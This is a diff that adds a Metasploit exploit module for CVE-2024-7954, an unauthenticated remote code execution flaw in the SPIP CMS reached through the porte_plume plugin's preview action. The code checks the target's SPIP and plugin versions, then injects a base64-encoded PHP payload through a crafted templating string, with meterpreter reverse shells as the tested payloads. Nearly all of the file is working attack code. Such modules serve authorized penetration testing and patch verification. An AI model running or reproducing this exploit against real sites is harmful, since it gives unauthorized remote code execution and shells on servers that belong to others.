@@ -1,0 +1,136 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Payload::Php
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HTTP::Spip
+  prepend Msf::Exploit::Remote::AutoCheck
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'SPIP Unauthenticated RCE via porte_plume Plugin',
+        'Description' => %q{
+          This module exploits a Remote Code Execution vulnerability in SPIP versions up to and including 4.2.12.
+          The vulnerability occurs in SPIP’s templating system where it incorrectly handles user-supplied input,
+          allowing an attacker to inject and execute arbitrary PHP code. This can be achieved by crafting a
+          payload manipulating the templating data processed by the `echappe_retour()` function, invoking
+          `traitements_previsu_php_modeles_eval()`, which contains an `eval()` call.
+        },
+        'Author' => [
+          'Valentin Lobstein',  # Metasploit module author
+          'Laluka',             # Vulnerability discovery
+          'Julien Voisin'       # Review
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          ['CVE', '2024-7954'],
+          ['URL', 'https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-0-alpha2-SPIP-4-2-13-SPIP-4.html'],
+          ['URL', 'https://thinkloveshare.com/hacking/spip_preauth_rce_2024_part_1_the_feather']
+        ],
+        'Platform' => ['php', 'unix', 'linux', 'win'],
+        'Arch' => [ARCH_PHP, ARCH_CMD],
+        'Targets' => [
+          [
+            'PHP In-Memory', {
+              'Platform' => 'php',
+              'Arch' => ARCH_PHP
+              # tested with php/meterpreter/reverse_tcp
+            }
+          ],
+          [
+            'Unix/Linux Command Shell', {
+              'Platform' => ['unix', 'linux'],
+              'Arch' => ARCH_CMD
+              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
+            }
+          ],
+          [
+            'Windows Command Shell', {
+              'Platform' => 'win',
+              'Arch' => ARCH_CMD
+              # tested with cmd/windows/http/x64/meterpreter/reverse_tcp
+            }
+          ]
+        ],
+        'DefaultTarget' => 0,
+        'Privileged' => false,
+        'DisclosureDate' => '2024-08-16',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
+        }
+      )
+    )
+  end
+
+  def check
+    rversion = spip_version || spip_plugin_version('spip')
+    return Exploit::CheckCode::Unknown('Unable to determine the version of SPIP') unless rversion
+
+    print_status("SPIP Version detected: #{rversion}")
+
+    vulnerable_ranges = [
+      { start: Rex::Version.new('4.2.0'), end: Rex::Version.new('4.2.12') },
+      { start: Rex::Version.new('4.1.0'), end: Rex::Version.new('4.1.15') },
+      { start: Rex::Version.new('0.0.0'), end: Rex::Version.new('4.0.99') }
+    ]
+
+    is_vulnerable = vulnerable_ranges.any? { |range| rversion.between?(range[:start], range[:end]) }
+
+    unless is_vulnerable
+      return CheckCode::Safe("The detected SPIP version (#{rversion}) is not vulnerable.")
+    end
+
+    print_good("SPIP version #{rversion} is vulnerable.")
+    plugin_version = spip_plugin_version('porte_plume')
+
+    unless plugin_version
+      print_warning('Could not determine the version of the porte_plume plugin.')
+      return CheckCode::Appears("The detected SPIP version (#{rversion}) is vulnerable.")
+    end
+
+    print_status("Porte plume plugin version detected: #{plugin_version}")
+    if plugin_version < Rex::Version.new('3.1.6')
+      return CheckCode::Appears("Both the detected SPIP version (#{rversion}) and porte_plume version (#{plugin_version}) are vulnerable.")
+    end
+
+    CheckCode::Appears("The detected SPIP version (#{rversion}) is vulnerable.")
+  end
+
+  def php_exec_cmd(encoded_payload)
+    dis = '$' + Rex::Text.rand_text_alpha(rand(4..7))
+    encoded_clean_payload = Rex::Text.encode_base64(encoded_payload)
+    shell = <<-END_OF_PHP_CODE
+        #{php_preamble(disabled_varname: dis)}
+        $c = base64_decode("#{encoded_clean_payload}");
+        #{php_system_block(cmd_varname: '$c', disabled_varname: dis)}
+    END_OF_PHP_CODE
+    return shell
+  end
+
+  def exploit
+    print_status('Preparing to send exploit payload to the target...')
+    phped_payload = target['Arch'] == ARCH_PHP ? payload.encoded : php_exec_cmd(payload.encoded)
+    b64_payload = framework.encoders.create('php/base64').encode(phped_payload)
+    payload = "[<img#{Rex::Text.rand_text_numeric(8)}>->URL`<?php #{b64_payload} ?>`]"
+
+    print_status('Sending exploit payload to the target...')
+    send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'spip.php'),
+      'vars_get' => {
+        'action' => 'porte_plume_previsu'
+      },
+      'data' => "data=#{payload}"
+    })
+  end
+
+end
